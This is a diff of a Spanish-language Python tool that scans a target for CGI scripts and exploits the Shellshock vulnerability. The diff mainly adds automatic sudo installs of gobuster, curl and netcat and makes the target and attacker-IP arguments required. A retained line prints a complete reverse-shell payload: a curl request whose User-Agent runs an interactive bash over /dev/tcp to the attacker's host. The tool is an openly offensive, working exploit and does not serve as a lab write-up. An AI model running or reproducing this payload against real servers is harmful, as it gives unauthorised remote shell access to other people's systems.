@@ -8,7 +8,7 @@ import time
 import shutil
 
 def check_dependencies():
-    """Verifica si las dependencias necesarias están instaladas."""
+    """Verifica si las dependencias necesarias están instaladas y las instala automáticamente."""
     dependencies = ["gobuster", "curl", "nc"]
     missing = []
 
@@ -18,25 +18,22 @@ def check_dependencies():
 
     if missing:
         print(f"[!] Faltan las siguientes dependencias: {', '.join(missing)}")
-        print("[!] Por favor, instala las dependencias necesarias con:")
+        print("[*] Instalando dependencias automáticamente...")
 
-        if "gobuster" in missing:
-            print("    - sudo apt install gobuster")
-        if "curl" in missing:
-            print("    - sudo apt install curl")
-        if "nc" in missing:
-            print("    - sudo apt install netcat-traditional o netcat-openbsd")
+        # Instalar dependencias faltantes
+        for dep in missing:
+            if dep == "gobuster":
+                print("[*] Instalando gobuster...")
+                subprocess.run(["sudo", "apt", "install", "gobuster", "-y"], check=True)
+            elif dep == "curl":
+                print("[*] Instalando curl...")
+                subprocess.run(["sudo", "apt", "install", "curl", "-y"], check=True)
+            elif dep == "nc":
+                print("[*] Instalando netcat...")
+                subprocess.run(["sudo", "apt", "install", "netcat-traditional", "-y"], check=True)
 
-        with open("requirements.txt", "w") as f:
-            if "gobuster" in missing:
-                f.write("gobuster\n")
-            if "curl" in missing:
-                f.write("curl\n")
-            if "nc" in missing:
-                f.write("netcat-traditional\n")
-
-        print(f"[+] Se ha creado un archivo requirements.txt con las dependencias faltantes")
-        return False
+        print("[+] Dependencias instaladas correctamente.")
+        return True
 
     return True
 
@@ -262,25 +259,11 @@ def exploit_shellshock(target_ip, cgi_script, attacker_ip, attacker_port):
         print("[*] Intenta ejecutar manualmente el comando:")
         print(f"    curl -H 'User-Agent: () {{ :; }}; /bin/bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1' http://{target_ip}/cgi-bin/{cgi_script}")
 
-def get_user_input():
-    """Solicita al usuario los datos necesarios al inicio del script."""
-    target_ip = input("[?] Introduce la IP del servidor objetivo: ")
-    attacker_ip = input("[?] Introduce tu IP de atacante para la shell inversa: ")
-    attacker_port = input("[?] Introduce el puerto para la shell inversa [default: 7777]: ")
-    wordlist_path = input("[?] Introduce la ruta al diccionario para gobuster [dejar en blanco para usar el predeterminado]: ")
-    
-    if not attacker_port:
-        attacker_port = 7777
-    else:
-        attacker_port = int(attacker_port)
-        
-    return target_ip, attacker_ip, attacker_port, wordlist_path
-
 def main():
     parser = argparse.ArgumentParser(description='Escáner y explotador de vulnerabilidad Shellshock')
-    parser.add_argument('--target', '-t', help='IP del servidor objetivo', required=False)
-    parser.add_argument('--attacker-ip', '-a', help='IP del atacante para la shell inversa', required=False)
-    parser.add_argument('--attacker-port', '-p', help='Puerto del atacante para la shell inversa', type=int, default=7777, required=False)
+    parser.add_argument('--target', '-t', help='IP del servidor objetivo', required=True)
+    parser.add_argument('--attacker-ip', '-a', help='IP del atacante para la shell inversa', required=True)
+    parser.add_argument('--attacker-port', '-p', help='Puerto del atacante para la shell inversa', type=int, default=7777, required=True)
     parser.add_argument('--cgi-script', '-c', help='Script CGI específico a probar (opcional)', required=False)
     parser.add_argument('--wordlist', '-w', help='Ruta a la wordlist para gobuster', required=False)
 
@@ -290,15 +273,12 @@ def main():
     print("=== Escáner y Explotador de Vulnerabilidad Shellshock ===")
     print("=" * 60)
 
-    # Verificar dependencias
+    # Verificar e instalar dependencias automáticamente
     if not check_dependencies():
         sys.exit(1)
 
-    # Solicitar datos del usuario al inicio
-    target_ip, attacker_ip, attacker_port, user_wordlist = get_user_input()
-    
     # Verificar la ruta del wordlist
-    wordlist_path = check_wordlist_path(user_wordlist)
+    wordlist_path = check_wordlist_path(args.wordlist)
     
     # Si se proporcionó un script CGI específico como argumento, usarlo directamente
     if args.cgi_script:
@@ -306,7 +286,7 @@ def main():
         print(f"[*] Usando script CGI especificado: {args.cgi_script}")
     else:
         # Buscar scripts CGI
-        cgi_scripts = find_cgi_scripts(target_ip, wordlist_path)
+        cgi_scripts = find_cgi_scripts(args.target, wordlist_path)
 
     if not cgi_scripts:
         print("[!] No se encontraron scripts CGI para probar.")
@@ -321,7 +301,7 @@ def main():
     # Verificar vulnerabilidad shellshock en cada script
     vulnerable_scripts = []
     for script in cgi_scripts:
-        if check_shellshock(target_ip, script):
+        if check_shellshock(args.target, script):
             vulnerable_scripts.append(script)
 
     if not vulnerable_scripts:
@@ -331,7 +311,7 @@ def main():
             script_name = input("[?] Introduce el nombre del script CGI a probar: ")
             if script_name not in cgi_scripts:
                 cgi_scripts.append(script_name)
-                if check_shellshock(target_ip, script_name):
+                if check_shellshock(args.target, script_name):
                     vulnerable_scripts.append(script_name)
                 else:
                     print("[!] No se detectó vulnerabilidad. Saliendo.")
@@ -349,7 +329,7 @@ def main():
         selected_script = vulnerable_scripts[selection]
 
     # Explotar la vulnerabilidad
-    exploit_shellshock(target_ip, selected_script, attacker_ip, attacker_port)
+    exploit_shellshock(args.target, selected_script, args.attacker_ip, args.attacker_port)
 
     print("\n[*] Proceso completado")
 
